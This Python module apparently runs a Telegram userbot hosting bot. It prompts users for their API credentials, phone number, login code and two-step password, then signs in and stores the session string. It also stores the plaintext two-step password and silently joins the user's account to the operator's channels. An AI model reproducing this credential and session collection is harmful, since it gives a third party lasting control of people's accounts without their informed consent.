import asyncio
import datetime
import importlib
from asyncio import sleep
from datetime import datetime, timedelta
from time import time

from dateutil.relativedelta import relativedelta
from pyrogram import *
from pyrogram.errors import *
from pyrogram.types import *
from pytz import timezone

from ubot import *
from ubot.config import *
from ubot.modules import loadModule
from ubot.utils import *
from ubot.utils.dbfunctions import *


def DATETIMEBOT():
    mydate = datetime.now(timezone("Asia/Jakarta"))
    da = mydate.strftime("🗓️ Tanggal: %d/%m/%Y")
    dt = mydate.strftime("🕕 Jam: %H:%M")
    f_d = f"{da}\n{dt}"
    return f_d


# @bot.on_callback_query(filters.regex("buat_bot"))
async def bikin_ubot(_, callback_query):
    user_id = callback_query.from_user.id
    try:
        await callback_query.message.delete()
        api_id_msg = await bot.ask(
            user_id,
            (
                "<b>Silahkan masukkan API ID anda.</b>\n"
                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, api_id_msg.text):
        return
    try:
        api_id = int(api_id_msg.text)
    except ValueError:
        return await bot.send_message(user_id, "API ID Haruslah berupa angka.")
    await callback_query.message.delete()
    api_hash_msg = await bot.ask(
        user_id,
        (
            "<b>Silahkan masukkan API HASH anda.</b>\n"
            "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
        ),
        timeout=300,
    )
    if await is_cancel(callback_query, api_hash_msg.text):
        return
    api_hash = api_hash_msg.text
    try:
        await callback_query.message.delete()
        phone = await bot.ask(
            user_id,
            (
                "<b>Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format Kode Negara.\nContoh: +628xxxxxxx</b>\n"
                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=api_id,
        api_hash=api_hash,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<b>Mengirim Kode OTP...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except FloodWait as FW:
        await get_otp.delete()
        return await bot.send_message(user_id, FW)
    except ApiIdInvalid as AII:
        await get_otp.delete()
        return await bot.send_message(user_id, AII)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                "<b>Silakan Periksa Kode OTP dari <a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi. Kirim Kode OTP ke sini setelah membaca Format di bawah ini.</b>\n"
                "\nJika Kode OTP adalah <code>12345</code> Tolong <b>[ TAMBAHKAN SPASI ]</b> kirimkan Seperti ini <code>1 2 3 4 5</code>\n"
                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu Telah Habis")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<b>Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.\n\nGunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "Batas waktu tercapai 5 menit.")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "<b>Tunggu Sebentar Sedang Memproses Akun Anda...</b>",
        disable_web_page_preview=True,
    )
    ping = "🏓"
    ping_id = "<emoji id=5269563867305879894>🏓</emoji>"
    pong = "🥵"
    pong_id = "<emoji id=6183961455436498818>🥵</emoji>"
    proses = "🔄"
    proses_id = "<emoji id=6113844439292054570>🔄</emoji>"
    gagal = "❌"
    gagal_id = "<emoji id=6113872536968104754>❌</emoji>"
    sukses = "✅"
    sukses_id = "<emoji id=6113647841459047673>✅</emoji>"
    profil = "👤"
    profil_id = "<emoji id=5373012449597335010>👤</emoji>"
    alive = "⭐"
    alive_id = "<emoji id=6127272826341690178>⭐</emoji>"
    await new_client.start()
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        await rem_two_factor(new_client.me.id)
        return await bot_msg.edit(
            "<b>Gunakan Akun Telegram Anda !! Bukan Orang Lain.</b>"
        )
    dia = new_client.me.is_premium
    if dia == True:
        await set_var(new_client.me.id, "emo_ping", ping_id)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_pong", pong_id)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_proses", proses_id)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_gagal", gagal_id)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_sukses", sukses_id)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_profil", profil_id)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_alive", alive_id)
        await sleep(0.5)
    elif dia == False:
        await set_var(new_client.me.id, "emo_ping", ping)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_pong", pong)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_proses", proses)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_gagal", gagal)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_sukses", sukses)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_profil", profil)
        await sleep(0.5)
        await set_var(new_client.me.id, "emo_alive", alive)
        await sleep(0.5)
    expired = None
    if new_client.me.id in await get_seles():
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=12)
        await set_expired_date(new_client.me.id, expired)
    else:
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=1)
        await set_expired_date(new_client.me.id, expired)
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=api_id,
        api_hash=api_hash,
        session_string=session_string,
    )
    await set_uptime(new_client.me.id, time())
    await sleep(1)
    if new_client.me.id in await get_seles():
        now = datetime.now(timezone("Asia/Jakarta"))
        now.strftime("%d-%m-%Y")
        expire_date = now + timedelta(days=365)
        await set_expired_date(new_client.me.id, expire_date)
    else:
        now = datetime.now(timezone("Asia/Jakarta"))
        now.strftime("%d-%m-%Y")
        expire_date = now + timedelta(days=30)
        await set_expired_date(new_client.me.id, expire_date)
    if callback_query.from_user.id not in await get_seles():
        try:
            await remove_prem(callback_query.from_user.id)
        except BaseException:
            pass
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"ubot.modules.{mod}"))
    text_done = f"<b>🔥 {bot.me.mention} Berhasil Di Aktifkan Di Akun :\n<a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code>.</b>"
    await bot_msg.edit(text_done)
    buttons = [
        [
            InlineKeyboardButton(
                "Cek Kadaluarsa",
                callback_data=f"cek_masa_aktif {new_client.me.id}",
            )
        ],
    ]
    try:
        await new_client.join_chat("varclsc")
        await new_client.join_chat("vatcls")
        await new_client.join_chat("-")
    except UserAlreadyParticipant:
        pass
    return await bot.send_message(
        SKY,
        f"""
<b>❏ Userbot Diaktifkan</b>
<b> ├ Akun :</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b> ╰ ID :</b> <code>{new_client.me.id}</code>
""",
        reply_markup=InlineKeyboardMarkup(buttons),
        disable_web_page_preview=True,
    )


@KY.BOT("delubot")
async def _(client, message):
    message.from_user.id
    if message.from_user.id not in await get_seles():
        await message.reply("<code> Tidak punya akses</code>.")
        return
    if len(message.command) < 2:
        return await message.reply("Ketik /delubot user_id Untuk Mematikan Userbot")
    else:
        for X in ubot._ubot:
            try:
                user = await bot.get_users(message.text.split()[1])
                await remove_ubot(user.id)
                await rem_expired_date(user.id)
                await rem_uptime(user.id)
                await rem_pref(user.id)
                await eor(
                    message, f"<b> ✅ {user.mention} Berhasil Dihapus Dari Database</b>"
                )
                return await bot.send_message(
                    user.id, "<b>💬 MASA AKTIF ANDA TELAH BERAKHIR"
                )
            except Exception as e:
                return await message.reply(f"<b>❌ {e} </b>")


@KY.BOT(["restart"])
async def restart_cmd2(client, message):
    my_id = []
    for _ubot_ in ubot._ubot:
        my_id.append(_ubot_.me.id)
    msg = await message.reply("<b>Processing...</b>", quote=True)
    if message.from_user.id not in my_id:
        return await msg.edit(f"<b>Anda bukan pengguna @{bot.me.username}!!</b>")
    for X in ubot._ubot:
        if message.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        UB = Ubot(**_ubot_)
                        UB.in_memory = False
                        await UB.start()
                        # await bot.connect()
                        # await bot.start()
                        for mod in loadModule():
                            importlib.reload(
                                importlib.import_module(f"ubot.modules.{mod}")
                            )
                        return await msg.edit(
                            f"<b>✅ Berhasil Di Restart {UB.me.first_name} {UB.me.last_name or ''} | {UB.me.id}.</b>"
                        )
                    except Exception as error:
                        return await msg.edit(f"<b>{error}</b>")


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        user_id = callback_query.from_user.id
        await bot.send_message(user_id, "<b>Membatalkan Proses Pembuatan Userbot!</b>")
        return True
    return False
